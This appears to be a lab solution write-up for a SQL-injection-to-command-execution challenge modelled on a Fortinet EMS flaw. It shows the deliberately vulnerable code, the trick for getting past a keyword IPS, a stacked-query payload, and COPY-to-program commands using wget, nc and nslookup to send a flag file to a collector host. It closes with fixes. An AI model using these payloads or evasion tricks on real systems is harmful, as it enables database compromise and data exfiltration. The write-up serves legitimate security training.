# Solution — sqli-fortinet-ems-fctuid-rce

> **OWASP:** A03:2021-Injection · **CWE:** CWE-89 (SQLi) → CWE-78 (OS command
> injection) · **CVE analog:** CVE-2023-48788 (Fortinet FortiClient EMS SQLi →
> RCE) — abstracted; no proprietary code reproduced.

## What tipped you off

`POST /device/register` returns `{"ok": true}` for normal payloads and a database
error message for `X-FCTUID: x'`. The header reaches SQL. But every "loud" probe
(`UNION SELECT`, `... FROM information_schema.tables`, `SLEEP(5)`, `OR 1=1`) comes
back with `403 {"blocked_by":"acme-ips", "rule":"..."}`. The signature list is
keyword-based; the payload you need must avoid every one of those keywords.

## The class of bug

SQL injection (CWE-89) escalating to command execution (CWE-78) because the
application's database role is a **Postgres superuser** — the "app runs as
sysadmin" misconfiguration the CVE hinges on. `src/app.py`:

```python
fctuid = request.headers.get("X-FCTUID", "")
if ips_block(fctuid): return 403
hostname = request.headers.get("X-FCT-Host", "unknown")
sql = ("INSERT INTO devices (fctuid, hostname, registered_at) "
       "VALUES ('" + fctuid + "', %s, now())")
cur.execute(sql, (hostname,))   # psycopg2 .execute() runs multiple ';' statements
```

Only `X-FCTUID` is concatenated (and it is the IPS-guarded input). `X-FCT-Host` is
**bound** as a parameter — so it is not a second, unfiltered injection point that
would let a learner sidestep the IPS entirely. The lab's headline lesson (evade
the naive keyword IPS with a table-source `COPY`) has to actually apply.

psycopg2 `.execute()` uses the simple query protocol, so a stacked statement runs
after the audit insert.

## Getting past the naive IPS (the tradecraft)

The IPS blocks the SQL keywords `SELECT`, `UNION SELECT`, `FROM`,
`INFORMATION_SCHEMA`, `SLEEP(` and classic tautologies (`OR n=n`, `OR 'a'='a'`).
It does **not** model SQL grammar, so anything that doesn't contain those tokens
sails through — including Postgres's **table-source** form of `COPY ... TO
PROGRAM`:

```sql
COPY audit_log TO PROGRAM 'wget --post-file=/labflag/flag.txt http://oob:9000/x';
```

There is no `SELECT` here at all. `COPY <table> TO PROGRAM 'cmd'` writes the
table's rows to the program's stdin — but the actual side-effect we want is the
command running. `wget` fires and posts the flag file to the in-lab collector.
(If you insisted on `SELECT`, `/**/select/**/` would evade the naive regex too;
the table-source form is cleaner and the intended path.)

## Building the exploit

Stack the RCE into the audit insert. The base statement has three columns —
`fctuid, hostname, registered_at` — so the injected header supplies the remaining
two values, closes that row, runs the RCE statement, and comments out the tail:

```
X-FCTUID: u', 'attacker-01', now()); COPY audit_log TO PROGRAM
          'wget -q -O- --post-file=/labflag/flag.txt http://oob:9000/exfil'; --
```

The DB role is a superuser, so `COPY ... TO PROGRAM` succeeds. `wget` posts the
planted flag file to the collector on the `backend` network. Read what the
collector captured through the app's proxy:

```
GET /oob/received
{"count":1,"items":[{"path":"/exfil","length":73,"body_b64":"RkxBR3sxOWMz..."}]}
```

Base64-decode the body, extract `FLAG{...}`, submit to `/solve`.

`tests/exploit.py` performs the whole chain (stdlib only) and finishes in well
under a second.

## Why the OOB channel matters here

Classic SQLi reads secrets from the response. Here there IS no response channel:
the register endpoint always returns the same `{"ok": true}`, and the IPS forbids
UNION reads even if you tried. So you don't read data — you **push** it to an
attacker-controlled listener and pick it up separately. That is the shape of a
real appliance breach, where the DB has no route to the public internet but does
share a management LAN with something else the attacker can also touch.

## Why RCE stays risk:low

`COPY ... TO PROGRAM` runs your command as the unprivileged postgres uid (`70`)
and needs **no added Linux capabilities**, so `cap_drop: ALL`, read-only rootfs,
`no-new-privileges`, and pids/memory caps are all kept. The Postgres container is
on an `internal: true` (no-egress) network — the DB has no default route, TCP to
1.1.1.1 fails, DNS times out. The ONLY listener reachable from the RCE is the
in-lab OOB collector on the same private network. A shell you obtain cannot phone
home or pivot off the host.

## Lab-vs-production deviations

- **Stack abstracted to Linux.** The catalogue specified ASP.NET + Windows Server
  Core 2022 + MSSQL 2022. MSSQL Server needs ~2 GB RAM and a ~1.5 GB image, which
  blows the platform's `mem_limit: 512m` / `<300 MB` gates; Windows containers
  cannot run on the Linux Docker host at all. The lab is re-platformed onto the
  project's Flask + PostgreSQL stack, with the taught primitive unchanged
  (psycopg2 `.execute()` stacks statements exactly like MSSQL `SqlCommand`, and
  Postgres `COPY ... TO PROGRAM` is the direct analogue of MSSQL `xp_cmdshell`
  after `sp_configure`). IIS is a transport detail and is omitted.
- **App connects as a superuser INTENTIONALLY.** Unlike the moveit lab (where the
  session-forgery goal did not need superuser and shipping one would be an
  unintended RCE), _this_ lab's whole point is superuser abuse. Containment is
  the standard sandbox plus the egress-drop network; the collector sidecar is
  the only reachable listener.
- **Flag planted via superuser `COPY TO`, derived app-side.** The raw
  `LAB_USER_SECRET` never reaches Postgres; a shell obtained via the RCE reads
  _this_ instance's flag but cannot forge others'. The flag is on the DB
  filesystem, not in a table, so no SQL `SELECT` shortcut.
- **Custom stdlib collector** in place of a commercial OOB service — smaller,
  offline-safe, and no extra image pulled (uses the same base as the app).

## Alternative payload vectors

1. **`nc` instead of `wget`**: `COPY audit_log TO PROGRAM 'cat /labflag/flag.txt
| nc oob 9000'` — same primitive, different transport.
2. **Comment-obfuscated SELECT**: `/**/select/**/` evades the naive regex; the
   table-source `COPY` is cleaner and doesn't need obfuscation.
3. **DNS-only exfil**: `COPY audit_log TO PROGRAM 'nslookup $(cat /labflag/flag.txt).oob'`
   — turns each character into a subdomain lookup. Useful when the collector only
   speaks DNS.

## Fix

- **Do not connect the app as a database superuser** — a least-privilege role
  cannot `COPY ... PROGRAM`. This is the same fix the moveit lab lands on.
- **Parameterise** the audit `INSERT` (`cur.execute(sql, (fctuid, hostname))`).
- **Do not rely on a keyword IPS** — it will always miss something (a
  table-source `COPY`, comment obfuscation, encoding). Treat it as
  defence-in-depth, not the control.
